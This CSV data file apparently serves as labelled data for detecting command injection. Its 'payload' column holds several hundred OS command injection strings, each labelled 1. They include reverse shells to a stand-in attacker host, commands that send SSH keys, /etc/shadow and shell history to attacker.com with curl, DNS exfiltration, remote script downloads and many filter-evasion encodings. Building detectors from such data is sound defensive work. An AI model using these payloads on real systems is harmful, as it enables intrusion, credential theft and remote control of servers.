payload,label
| netstat -an | curl -X POST -d @- http://attacker.com,1
|| ls -la | curl -X POST -d @- http://attacker.com,1
|| ps aux | curl -X POST -d @- http://attacker.com,1
|| netstat -an | curl -X POST -d @- http://attacker.com,1
& ls -la | curl -X POST -d @- http://attacker.com,1
& ps aux | curl -X POST -d @- http://attacker.com,1
& netstat -an | curl -X POST -d @- http://attacker.com,1
&& ls -la | curl -X POST -d @- http://attacker.com,1
&& ps aux | curl -X POST -d @- http://attacker.com,1
&& netstat -an | curl -X POST -d @- http://attacker.com,1
; cat ~/.ssh/id_rsa | curl -X POST -d @- http://attacker.com,1
; cat ~/.ssh/authorized_keys | curl -X POST -d @- http://attacker.com,1
; cat ~/.bash_history | curl -X POST -d @- http://attacker.com,1
| cat ~/.ssh/id_rsa | curl -X POST -d @- http://attacker.com,1
| cat ~/.ssh/authorized_keys | curl -X POST -d @- http://attacker.com,1
| cat ~/.bash_history | curl -X POST -d @- http://attacker.com,1
|| cat ~/.ssh/id_rsa | curl -X POST -d @- http://attacker.com,1
|| cat ~/.ssh/authorized_keys | curl -X POST -d @- http://attacker.com,1
|| cat ~/.bash_history | curl -X POST -d @- http://attacker.com,1
& cat ~/.ssh/id_rsa | curl -X POST -d @- http://attacker.com,1
& cat ~/.ssh/authorized_keys | curl -X POST -d @- http://attacker.com,1
& cat ~/.bash_history | curl -X POST -d @- http://attacker.com,1
&& cat ~/.ssh/id_rsa | curl -X POST -d @- http://attacker.com,1
&& cat ~/.ssh/authorized_keys | curl -X POST -d @- http://attacker.com,1
&& cat ~/.bash_history | curl -X POST -d @- http://attacker.com,1
; %6c%73,1
; %69%64,1
; %70%77%64,1
; %77%68%6f%61%6d%69,1
| %6c%73,1
| %69%64,1
| %70%77%64,1
| %77%68%6f%61%6d%69,1
|| %6c%73,1
|| %69%64,1
|| %70%77%64,1
|| %77%68%6f%61%6d%69,1
& %6c%73,1
& %69%64,1
& %70%77%64,1
& %77%68%6f%61%6d%69,1
&& %6c%73,1
&& %69%64,1
&& %70%77%64,1
&& %77%68%6f%61%6d%69,1
%3b ls,1
%3b id,1
%3b pwd,1
%3b whoami,1
%7c ls,1
%7c id,1
%7c pwd,1
%7c whoami,1
%7c%7c ls,1
%7c%7c id,1
%7c%7c pwd,1
%7c%7c whoami,1
%26 ls,1
%26 id,1
%26 pwd,1
%26 whoami,1
%26%26 ls,1
%26%26 id,1
%26%26 pwd,1
%26%26 whoami,1
%3b%20ls,1
%3b%20id,1
%3b%20pwd,1
%3b%20whoami,1
%7c%20ls,1
%7c%20id,1
%7c%20pwd,1
%7c%20whoami,1
%26%20ls,1
%26%20id,1
%26%20pwd,1
%26%20whoami,1
%0a ls,1
%0a id,1
%0a pwd,1
%0a whoami,1
%0d ls,1
%0d id,1
%0d pwd,1
%0d whoami,1
%0a%0d ls,1
%0a%0d id,1
%0a%0d pwd,1
%0a%0d whoami,1
\n ls,1
\n id,1
\n pwd,1
\n whoami,1
\r ls,1
\r id,1
\r pwd,1
\r whoami,1
\r\n ls,1
\r\n id,1
\r\n pwd,1
\r\n whoami,1
%0als,1
%0aid,1
%0apwd,1
%0awhoami,1
%0dls,1
%0did,1
%0dpwd,1
%0dwhoami,1
; c\at /etc/passwd,1
; c\at /e\tc/p\asswd,1
| c\at /etc/passwd,1
| c\at /e\tc/p\asswd,1
; cat /etc/pa\sswd,1
| cat /etc/pa\sswd,1
%26cat%20/etc/passwd,1
; ls -la,1
; cat /etc/shadow,1
; cat /etc/hosts,1
; cat /etc/issue,1
; cat /proc/version,1
; ip addr,1
; netstat -tunlp,1
; ps -ef,1
; env,1
; printenv,1
; echo $PATH,1
; echo $USER,1
; echo $HOME,1
| ls -la,1
| cat /etc/shadow,1
| cat /etc/hosts,1
| cat /etc/issue,1
| cat /proc/version,1
| ip addr,1
| netstat -tunlp,1
| ps -ef,1
| env,1
| printenv,1
| echo $PATH,1
| echo $USER,1
| echo $HOME,1
|| ls -la,1
|| cat /etc/shadow,1
|| cat /etc/hosts,1
|| cat /etc/issue,1
|| cat /proc/version,1
|| ip addr,1
|| netstat -tunlp,1
|| ps -ef,1
|| env,1
|| printenv,1
|| echo $PATH,1
|| echo $USER,1
|| echo $HOME,1
& ls -la,1
& cat /etc/shadow,1
& cat /etc/hosts,1
& cat /etc/issue,1
& cat /proc/version,1
& ip addr,1
& netstat -tunlp,1
& ps -ef,1
& env,1
& printenv,1
& echo $PATH,1
& echo $USER,1
& echo $HOME,1
&& ls -la,1
&& cat /etc/shadow,1
&& cat /etc/hosts,1
&& cat /etc/issue,1
&& cat /proc/version,1
&& ip addr,1
&& netstat -tunlp,1
&& ps -ef,1
&& env,1
&& printenv,1
&& echo $PATH,1
&& echo $USER,1
&& echo $HOME,1
; wget http://example.com/shell.sh,1
; curl http://example.com/shell.sh,1
; fetch http://example.com/shell.sh,1
| wget http://example.com/shell.sh,1
| curl http://example.com/shell.sh,1
| fetch http://example.com/shell.sh,1
|| wget http://example.com/shell.sh,1
|| curl http://example.com/shell.sh,1
|| fetch http://example.com/shell.sh,1
& wget http://example.com/shell.sh,1
& curl http://example.com/shell.sh,1
& fetch http://example.com/shell.sh,1
&& wget http://example.com/shell.sh,1
&& curl http://example.com/shell.sh,1
&& fetch http://example.com/shell.sh,1
; nc -e /bin/sh 127.0.0.1 4444,1
; nc -c /bin/sh 127.0.0.1 4444,1
; ncat -e /bin/sh 127.0.0.1 4444,1
| nc -e /bin/sh 127.0.0.1 4444,1
| nc -c /bin/sh 127.0.0.1 4444,1
| ncat -e /bin/sh 127.0.0.1 4444,1
|| nc -e /bin/sh 127.0.0.1 4444,1
|| nc -c /bin/sh 127.0.0.1 4444,1
|| ncat -e /bin/sh 127.0.0.1 4444,1
& nc -e /bin/sh 127.0.0.1 4444,1
& nc -c /bin/sh 127.0.0.1 4444,1
& ncat -e /bin/sh 127.0.0.1 4444,1
&& nc -e /bin/sh 127.0.0.1 4444,1
&& nc -c /bin/sh 127.0.0.1 4444,1
&& ncat -e /bin/sh 127.0.0.1 4444,1
; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1,1
; sh -i >& /dev/tcp/127.0.0.1/4444 0>&1,1
| bash -i >& /dev/tcp/127.0.0.1/4444 0>&1,1
| sh -i >& /dev/tcp/127.0.0.1/4444 0>&1,1
|| bash -i >& /dev/tcp/127.0.0.1/4444 0>&1,1
|| sh -i >& /dev/tcp/127.0.0.1/4444 0>&1,1
& bash -i >& /dev/tcp/127.0.0.1/4444 0>&1,1
& sh -i >& /dev/tcp/127.0.0.1/4444 0>&1,1
&& bash -i >& /dev/tcp/127.0.0.1/4444 0>&1,1
&& sh -i >& /dev/tcp/127.0.0.1/4444 0>&1,1
"; find / -name ""*.conf""",1
; find / -type f -perm -4000,1
; find / -writable -type f,1
"| find / -name ""*.conf""",1
| find / -type f -perm -4000,1
| find / -writable -type f,1
"|| find / -name ""*.conf""",1
|| find / -type f -perm -4000,1
|| find / -writable -type f,1
"& find / -name ""*.conf""",1
& find / -type f -perm -4000,1
& find / -writable -type f,1
"&& find / -name ""*.conf""",1
&& find / -type f -perm -4000,1
&& find / -writable -type f,1
"; grep -r ""password"" /etc/",1
"; grep -r ""root"" /etc/",1
"; grep -r ""admin"" /etc/",1
"| grep -r ""password"" /etc/",1
"| grep -r ""root"" /etc/",1
"| grep -r ""admin"" /etc/",1
"|| grep -r ""password"" /etc/",1
"|| grep -r ""root"" /etc/",1
"|| grep -r ""admin"" /etc/",1
"& grep -r ""password"" /etc/",1
"& grep -r ""root"" /etc/",1
"& grep -r ""admin"" /etc/",1
"&& grep -r ""password"" /etc/",1
"&& grep -r ""root"" /etc/",1
"&& grep -r ""admin"" /etc/",1
; df -h,1
; mount,1
; lsblk,1
; fdisk -l,1
| df -h,1
| mount,1
| lsblk,1
| fdisk -l,1
|| df -h,1
|| mount,1
|| lsblk,1
|| fdisk -l,1
& df -h,1
& mount,1
& lsblk,1
& fdisk -l,1
&& df -h,1
&& mount,1
&& lsblk,1
&& fdisk -l,1
"; awk 'BEGIN {system(""id"")}'",1
"; perl -e 'system(""id"")'",1
"; python -c 'import os;os.system(""id"")'",1
"; ruby -e 'system(""id"")'",1
"; php -r 'system(""id"");'",1
"| awk 'BEGIN {system(""id"")}'",1
"| perl -e 'system(""id"")'",1
"| python -c 'import os;os.system(""id"")'",1
"| ruby -e 'system(""id"")'",1
"| php -r 'system(""id"");'",1
"|| awk 'BEGIN {system(""id"")}'",1
"|| perl -e 'system(""id"")'",1
"|| python -c 'import os;os.system(""id"")'",1
"|| ruby -e 'system(""id"")'",1
"|| php -r 'system(""id"");'",1
"& awk 'BEGIN {system(""id"")}'",1
"& perl -e 'system(""id"")'",1
"& python -c 'import os;os.system(""id"")'",1
"& ruby -e 'system(""id"")'",1
"& php -r 'system(""id"");'",1
"&& awk 'BEGIN {system(""id"")}'",1
"&& perl -e 'system(""id"")'",1
"&& python -c 'import os;os.system(""id"")'",1
"&& ruby -e 'system(""id"")'",1
"&& php -r 'system(""id"");'",1
; l\s,1
; i\d,1
; p\wd,1
; whoa\mi,1
| l\s,1
| i\d,1
| p\wd,1
| whoa\mi,1
|| l\s,1
|| i\d,1
|| p\wd,1
|| whoa\mi,1
& l\s,1
& i\d,1
& p\wd,1
& whoa\mi,1
&& l\s,1
&& i\d,1
&& p\wd,1
&& whoa\mi,1
; /b\in/l\s,1
; /b\in/i\d,1
; /b\in/p\wd,1
; /u\sr/b\in/whoa\mi,1
| /b\in/l\s,1
| /b\in/i\d,1
| /b\in/p\wd,1
| /u\sr/b\in/whoa\mi,1
; cat<</etc/passwd,1
| cat<</etc/passwd,1
"; {ls,-la}",1
"| {ls,-la}",1
; cat /e''tc/pa''sswd,1
"; cat /e""""tc/pa""""sswd",1
| cat /e''tc/pa''sswd,1
"| cat /e""""tc/pa""""sswd",1
; w'h'o'a'm'i,1
"; w""h""o""a""m""i",1
| w'h'o'a'm'i,1
"| w""h""o""a""m""i",1
; echo${IFS}vulnerable,1
; echo$IFS$9vulnerable,1
| echo${IFS}vulnerable,1
| echo$IFS$9vulnerable,1
; ${PATH:0:1}bin${PATH:0:1}ls,1
; ${PATH:~0:~1}bin${PATH:~0:~1}ls,1
| ${PATH:0:1}bin${PATH:0:1}ls,1
| ${PATH:~0:~1}bin${PATH:~0:~1}ls,1
; l${x}s,1
; i${x}d,1
; p${x}wd,1
; whoa${x}mi,1
| l${x}s,1
| i${x}d,1
| p${x}wd,1
| whoa${x}mi,1
; ls -la $HOME,1
; ls -la ~,1
| ls -la $HOME,1
| ls -la ~,1
; cat /etc/*release*,1
| cat /etc/*release*,1
; l$@s,1
; i$@d,1
; p$@wd,1
; whoa$@mi,1
| l$@s,1
| i$@d,1
| p$@wd,1
| whoa$@mi,1
; ls${u},1
; id${u},1
; pwd${u},1
; whoami${u},1
| ls${u},1
| id${u},1
| pwd${u},1
| whoami${u},1
; who$()ami,1
; who${}ami,1
| who$()ami,1
| who${}ami,1
; /???/??/l?,1
; /???/??/i?,1
; /???/??/p??,1
| /???/??/l?,1
| /???/??/i?,1
| /???/??/p??,1
; /???/???/whoa??,1
; /???/???/ls,1
| /???/???/whoa??,1
| /???/???/ls,1
; echo vulnerable | sed 's/e/E/',1
; echo vulnerable | tr 'a-z' 'A-Z',1
| echo vulnerable | sed 's/e/E/',1
| echo vulnerable | tr 'a-z' 'A-Z',1
; $(echo ls),1
; $(echo id),1
; $(echo pwd),1
; $(echo whoami),1
| $(echo ls),1
| $(echo id),1
| $(echo pwd),1
| $(echo whoami),1
; `echo ls`,1
; `echo id`,1
; `echo pwd`,1
; `echo whoami`,1
| `echo ls`,1
| `echo id`,1
| `echo pwd`,1
| `echo whoami`,1
; ls;#,1
; id;#,1
; pwd;#,1
; whoami;#,1
| ls;#,1
| id;#,1
| pwd;#,1
| whoami;#,1
; a=l;b=s;$a$b,1
; a=i;b=d;$a$b,1
; a=p;b=wd;$a$b,1
| a=l;b=s;$a$b,1
| a=i;b=d;$a$b,1
| a=p;b=wd;$a$b,1
; curl http://attacker.com/$(whoami),1
; wget http://attacker.com/$(whoami),1
; curl http://attacker.com/$(hostname),1
; wget http://attacker.com/$(hostname),1
| curl http://attacker.com/$(whoami),1
| wget http://attacker.com/$(whoami),1
| curl http://attacker.com/$(hostname),1
| wget http://attacker.com/$(hostname),1
|| curl http://attacker.com/$(whoami),1
|| wget http://attacker.com/$(whoami),1
|| curl http://attacker.com/$(hostname),1
|| wget http://attacker.com/$(hostname),1
& curl http://attacker.com/$(whoami),1
& wget http://attacker.com/$(whoami),1
& curl http://attacker.com/$(hostname),1
& wget http://attacker.com/$(hostname),1
&& curl http://attacker.com/$(whoami),1
&& wget http://attacker.com/$(whoami),1
&& curl http://attacker.com/$(hostname),1
&& wget http://attacker.com/$(hostname),1
; nslookup $(hostname).attacker.com,1
; nslookup $(id).attacker.com,1
| nslookup $(hostname).attacker.com,1
| nslookup $(id).attacker.com,1
|| nslookup $(hostname).attacker.com,1
|| nslookup $(id).attacker.com,1
& nslookup $(hostname).attacker.com,1
& nslookup $(id).attacker.com,1
&& nslookup $(hostname).attacker.com,1
&& nslookup $(id).attacker.com,1
; dig $(hostname).attacker.com,1
; dig $(id).attacker.com,1
| dig $(hostname).attacker.com,1
| dig $(id).attacker.com,1
|| dig $(hostname).attacker.com,1
|| dig $(id).attacker.com,1
& dig $(hostname).attacker.com,1
& dig $(id).attacker.com,1
&& dig $(hostname).attacker.com,1
&& dig $(id).attacker.com,1
; host $(whoami).attacker.com,1
; host $(hostname).attacker.com,1
| host $(whoami).attacker.com,1
| host $(hostname).attacker.com,1
|| host $(whoami).attacker.com,1
|| host $(hostname).attacker.com,1
& host $(whoami).attacker.com,1
& host $(hostname).attacker.com,1
&& host $(whoami).attacker.com,1
&& host $(hostname).attacker.com,1
; ping -n 1 $(whoami).attacker.com,1
; ping -n 1 $(hostname).attacker.com,1
| ping -n 1 $(whoami).attacker.com,1
| ping -n 1 $(hostname).attacker.com,1
|| ping -n 1 $(whoami).attacker.com,1
|| ping -n 1 $(hostname).attacker.com,1
& ping -n 1 $(whoami).attacker.com,1
& ping -n 1 $(hostname).attacker.com,1
&& ping -n 1 $(whoami).attacker.com,1
&& ping -n 1 $(hostname).attacker.com,1
; curl http://attacker.com/?x=$(cat /etc/passwd | base64),1
; wget http://attacker.com/?x=$(cat /etc/passwd | base64),1
| curl http://attacker.com/?x=$(cat /etc/passwd | base64),1
| wget http://attacker.com/?x=$(cat /etc/passwd | base64),1
|| curl http://attacker.com/?x=$(cat /etc/passwd | base64),1
|| wget http://attacker.com/?x=$(cat /etc/passwd | base64),1
& curl http://attacker.com/?x=$(cat /etc/passwd | base64),1
& wget http://attacker.com/?x=$(cat /etc/passwd | base64),1
&& curl http://attacker.com/?x=$(cat /etc/passwd | base64),1
&& wget http://attacker.com/?x=$(cat /etc/passwd | base64),1
; curl http://attacker.com:8080/$(uname -a),1
; wget http://attacker.com:8080/$(uname -a),1
| curl http://attacker.com:8080/$(uname -a),1
| wget http://attacker.com:8080/$(uname -a),1
|| curl http://attacker.com:8080/$(uname -a),1
|| wget http://attacker.com:8080/$(uname -a),1
& curl http://attacker.com:8080/$(uname -a),1
& wget http://attacker.com:8080/$(uname -a),1
&& curl http://attacker.com:8080/$(uname -a),1
&& wget http://attacker.com:8080/$(uname -a),1
; nc attacker.com 4444 -e /bin/sh,1
; nc attacker.com 4444 -c /bin/sh,1
; ncat attacker.com 4444 -e /bin/sh,1
| nc attacker.com 4444 -e /bin/sh,1
| nc attacker.com 4444 -c /bin/sh,1
| ncat attacker.com 4444 -e /bin/sh,1
|| nc attacker.com 4444 -e /bin/sh,1
|| nc attacker.com 4444 -c /bin/sh,1
|| ncat attacker.com 4444 -e /bin/sh,1
& nc attacker.com 4444 -e /bin/sh,1
& nc attacker.com 4444 -c /bin/sh,1
& ncat attacker.com 4444 -e /bin/sh,1
&& nc attacker.com 4444 -e /bin/sh,1
&& nc attacker.com 4444 -c /bin/sh,1
&& ncat attacker.com 4444 -e /bin/sh,1
; bash -i >& /dev/tcp/attacker.com/4444 0>&1,1
; sh -i >& /dev/tcp/attacker.com/4444 0>&1,1
| bash -i >& /dev/tcp/attacker.com/4444 0>&1,1
| sh -i >& /dev/tcp/attacker.com/4444 0>&1,1
|| bash -i >& /dev/tcp/attacker.com/4444 0>&1,1
|| sh -i >& /dev/tcp/attacker.com/4444 0>&1,1
& bash -i >& /dev/tcp/attacker.com/4444 0>&1,1
& sh -i >& /dev/tcp/attacker.com/4444 0>&1,1
&& bash -i >& /dev/tcp/attacker.com/4444 0>&1,1
&& sh -i >& /dev/tcp/attacker.com/4444 0>&1,1
; telnet attacker.com 4444 | /bin/sh,1
; telnet attacker.com 4444 | /bin/bash,1
| telnet attacker.com 4444 | /bin/sh,1
| telnet attacker.com 4444 | /bin/bash,1
|| telnet attacker.com 4444 | /bin/sh,1
|| telnet attacker.com 4444 | /bin/bash,1
& telnet attacker.com 4444 | /bin/sh,1
& telnet attacker.com 4444 | /bin/bash,1
&& telnet attacker.com 4444 | /bin/sh,1
&& telnet attacker.com 4444 | /bin/bash,1
"; curl -d ""data=$(whoami)"" http://attacker.com/receive",1
"; wget --post-data=""data=$(whoami)"" http://attacker.com/receive",1
"| curl -d ""data=$(whoami)"" http://attacker.com/receive",1
"| wget --post-data=""data=$(whoami)"" http://attacker.com/receive",1
"|| curl -d ""data=$(whoami)"" http://attacker.com/receive",1
"|| wget --post-data=""data=$(whoami)"" http://attacker.com/receive",1
"& curl -d ""data=$(whoami)"" http://attacker.com/receive",1
"& wget --post-data=""data=$(whoami)"" http://attacker.com/receive",1
"&& curl -d ""data=$(whoami)"" http://attacker.com/receive",1
"&& wget --post-data=""data=$(whoami)"" http://attacker.com/receive",1
; curl -X POST -d @/etc/passwd http://attacker.com/receive,1
; curl -X POST -d @/etc/shadow http://attacker.com/receive,1
| curl -X POST -d @/etc/passwd http://attacker.com/receive,1
| curl -X POST -d @/etc/shadow http://attacker.com/receive,1
|| curl -X POST -d @/etc/passwd http://attacker.com/receive,1
|| curl -X POST -d @/etc/shadow http://attacker.com/receive,1
& curl -X POST -d @/etc/passwd http://attacker.com/receive,1
& curl -X POST -d @/etc/shadow http://attacker.com/receive,1
&& curl -X POST -d @/etc/passwd http://attacker.com/receive,1
&& curl -X POST -d @/etc/shadow http://attacker.com/receive,1
; nslookup `whoami`.attacker.com,1
; nslookup `hostname`.attacker.com,1
| nslookup `whoami`.attacker.com,1
| nslookup `hostname`.attacker.com,1
|| nslookup `whoami`.attacker.com,1
|| nslookup `hostname`.attacker.com,1
& nslookup `whoami`.attacker.com,1
& nslookup `hostname`.attacker.com,1
&& nslookup `whoami`.attacker.com,1
&& nslookup `hostname`.attacker.com,1
; curl http://attacker.com/$(pwd | tr '/' '-'),1
; wget http://attacker.com/$(pwd | tr '/' '-'),1
| curl http://attacker.com/$(pwd | tr '/' '-'),1
| wget http://attacker.com/$(pwd | tr '/' '-'),1
|| curl http://attacker.com/$(pwd | tr '/' '-'),1
|| wget http://attacker.com/$(pwd | tr '/' '-'),1
& curl http://attacker.com/$(pwd | tr '/' '-'),1
& wget http://attacker.com/$(pwd | tr '/' '-'),1
&& curl http://attacker.com/$(pwd | tr '/' '-'),1
&& wget http://attacker.com/$(pwd | tr '/' '-'),1
"; curl -A ""User-Agent: $(whoami)"" http://attacker.com",1
"; wget --user-agent=""$(whoami)"" http://attacker.com",1
"| curl -A ""User-Agent: $(whoami)"" http://attacker.com",1
"| wget --user-agent=""$(whoami)"" http://attacker.com",1
"|| curl -A ""User-Agent: $(whoami)"" http://attacker.com",1
"|| wget --user-agent=""$(whoami)"" http://attacker.com",1
"& curl -A ""User-Agent: $(whoami)"" http://attacker.com",1
"& wget --user-agent=""$(whoami)"" http://attacker.com",1
"&& curl -A ""User-Agent: $(whoami)"" http://attacker.com",1
"&& wget --user-agent=""$(whoami)"" http://attacker.com",1
"; curl http://attacker.com -H ""X-Data: $(id)""",1
"; wget http://attacker.com --header=""X-Data: $(id)""",1
"| curl http://attacker.com -H ""X-Data: $(id)""",1
"| wget http://attacker.com --header=""X-Data: $(id)""",1
"|| curl http://attacker.com -H ""X-Data: $(id)""",1
"|| wget http://attacker.com --header=""X-Data: $(id)""",1
"& curl http://attacker.com -H ""X-Data: $(id)""",1
"& wget http://attacker.com --header=""X-Data: $(id)""",1
"&& curl http://attacker.com -H ""X-Data: $(id)""",1
"&& wget http://attacker.com --header=""X-Data: $(id)""",1
"; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
"| python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
"; perl -e 'use Socket;$i=""attacker.com"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");}'",1
"| perl -e 'use Socket;$i=""attacker.com"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");}'",1
"; ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",4444).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",1
"| ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",4444).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",1
"; php -r '$sock=fsockopen(""attacker.com"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",1
"| php -r '$sock=fsockopen(""attacker.com"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",1
; whoami; echo 'test',1
| whoami | echo 'test',1
|| whoami || echo 'test',1
& whoami & echo 'test',1
&& whoami && echo 'test',1
`whoami` && echo 'test',1
$(whoami) && echo 'test',1
test; whoami; test,1
test | whoami | test,1
test || whoami || test,1
test & whoami & test,1
test && whoami && test,1
test `whoami` test,1
test $(whoami) test,1
'; whoami; ',1
"""; whoami; """,1
'| whoami |',1
"""| whoami |""",1
'|| whoami ||',1
"""|| whoami ||""",1
'& whoami &',1
"""& whoami &""",1
'&& whoami &&',1
"""&& whoami &&""",1
'`whoami`',1
"""`whoami`""",1
'$(whoami)',1
"""$(whoami)""",1
') ; whoami ; (',1
""") ; whoami ; (""",1
') | whoami | (',1
""") | whoami | (""",1
') || whoami || (',1
""") || whoami || (""",1
') && whoami && (',1
""") && whoami && (""",1
'; whoami; echo ',1
"""; whoami; echo """,1
'|| whoami || echo ',1
"""|| whoami || echo """,1
1; whoami,1
1| whoami,1
1|| whoami,1
1& whoami,1
1&& whoami,1
1`whoami`,1
1$(whoami),1
a; whoami,1
a| whoami,1
a|| whoami,1
a& whoami,1
a&& whoami,1
a`whoami`,1
a$(whoami),1
-1; whoami,1
-1| whoami,1
-1|| whoami,1
-1& whoami,1
-1&& whoami,1
-1`whoami`,1
-1$(whoami),1
'; whoami; #,1
"""; whoami; #",1
'| whoami | #,1
"""| whoami | #",1
'|| whoami || #,1
"""|| whoami || #",1
'& whoami & #,1
"""& whoami & #",1
'&& whoami && #,1
"""&& whoami && #",1
'`whoami`#,1
"""`whoami`#",1
'$(whoami)#,1
"""$(whoami)#",1
%0a; whoami,1
%0a| whoami,1
%0a|| whoami,1
%0a& whoami,1
%0a&& whoami,1
%0a`whoami`,1
%0a$(whoami),1
%0d; whoami,1
%0d| whoami,1
%0d|| whoami,1
%0d& whoami,1
%0d&& whoami,1
%0d`whoami`,1
%0d$(whoami),1
%0a%0d; whoami,1
%0a%0d| whoami,1
%0a%0d|| whoami,1
%0a%0d& whoami,1
%0a%0d&& whoami,1
%0a%0d`whoami`,1
%0a%0d$(whoami),1
'; whoami; --,1
"""; whoami; --",1
'| whoami | --,1
"""| whoami | --",1
'; whoami; /*,1
"""; whoami; /*",1
'| whoami | /*,1
"""| whoami | /*",1
*/; whoami; /*,1
*/| whoami | /*,1
*/|| whoami || /*,1
*/& whoami & /*,1
*/&& whoami && /*,1
'; whoami; //,1
"""; whoami; //",1
'| whoami | //,1
"""| whoami | //",1
x'; whoami; ',1
"x""; whoami; """,1
x'| whoami |',1
"x""| whoami |""",1
x'|| whoami ||',1
"x""|| whoami ||""",1
'; whoami || ',1
"""; whoami || """,1
'; whoami && ',1
"""; whoami && """,1
`whoami` || echo 'test',1
$(whoami) || echo 'test',1
$(whoami)$(echo),1
`whoami``echo`,1
'; $(whoami); ',1
"""; $(whoami); """,1
'; `whoami`; ',1
"""; `whoami`; """,1
test'); whoami; ('test,1
"test""); whoami; (""test",1
test'| whoami |'test,1
"test""| whoami |""test",1
)); whoami; ((,1
""")); whoami; ((""",1
')); whoami; ((',1
]; whoami; [,1
"""]; whoami; [""",1
']; whoami; [',1
}; whoami; {,1
"""}; whoami; {""",1
'}; whoami; {',1
>; whoami,1
<; whoami,1
>>; whoami,1
<<; whoami,1
<>; whoami,1
>| whoami,1
<| whoami,1
>>| whoami,1
<<| whoami,1
<>| whoami,1
test'; whoami; echo 'test,1
"test""; whoami; echo ""test",1
'; whoami; exit; ',1
"""; whoami; exit; """,1
'|| whoami || exit ||',1
"""|| whoami || exit ||""",1
${IFS}whoami,1
$IFS$9whoami,1
{whoami},1
[whoami],1
(whoami),1
((whoami)),1
$'whoami',1
"$""whoami""",1
'; whoami${IFS}; ',1
"""; whoami${IFS}; """,1
'; who$()ami; ',1
"""; who$()ami; """,1
'; who${x}ami; ',1
"""; who${x}ami; """,1
'; who'am'i; ',1
"""; who""am""i; """,1
'\nwhoami\n',1
"""\nwhoami\n""",1
'\rwhoami\r',1
"""\rwhoami\r""",1
'; \nwhoami\n; ',1
"""; \nwhoami\n; """,1
%00; whoami,1
%00| whoami,1
%00|| whoami,1
%00& whoami,1
%00&& whoami,1
'; whoami%00,1
"""; whoami%00",1
'| whoami%00,1
"""| whoami%00",1
```; whoami; ```,1
"""""""; whoami; """"""",1
'''; whoami; ''',1
===; whoami; ===,1
---; whoami; ---,1
___; whoami; ___,1
***; whoami; ***,1
+++; whoami; +++,1
~~~; whoami; ~~~,1
@@@; whoami; @@@,1
$$$; whoami; $$$,1
%%%; whoami; %%%,1
^^^; whoami; ^^^,1
&&&; whoami; &&&,1
|||; whoami; |||,1
test' OR '1'='1'; whoami; --,1
"test"" OR ""1""=""1""; whoami; --",1
test' AND '1'='1'; whoami; --,1
"test"" AND ""1""=""1""; whoami; --",1
<script>; whoami; </script>,1
<img>; whoami; </img>,1
<?php ; whoami; ?>,1
<% ; whoami; %>,1
{{ ; whoami; }},1
{% ; whoami; %},1
${ ; whoami; },1
#{ ; whoami; },1
@{ ; whoami; },1
;ls,1
; ls;,1
;ls;,1
|ls,1
| ls |,1
|ls|,1
||ls,1
|| ls ||,1
||ls||,1
&ls,1
& ls &,1
&ls&,1
&&ls,1
&& ls &&,1
&&ls&&,1
`ls`,1
$(ls),1
${ls},1
${ ls },1
;id;,1
|id|,1
||id||,1
&id&,1
&&id&&,1
`id`,1
$(id),1
${id},1
%0a%0dls,1
%0a%0did,1
%0a%0dpwd,1
%0a%0dwhoami,1
\nls,1
\rid,1
\r\npwd,1
\n\rwhoami,1
; ls%00,1
| id%00,1
|| pwd%00,1
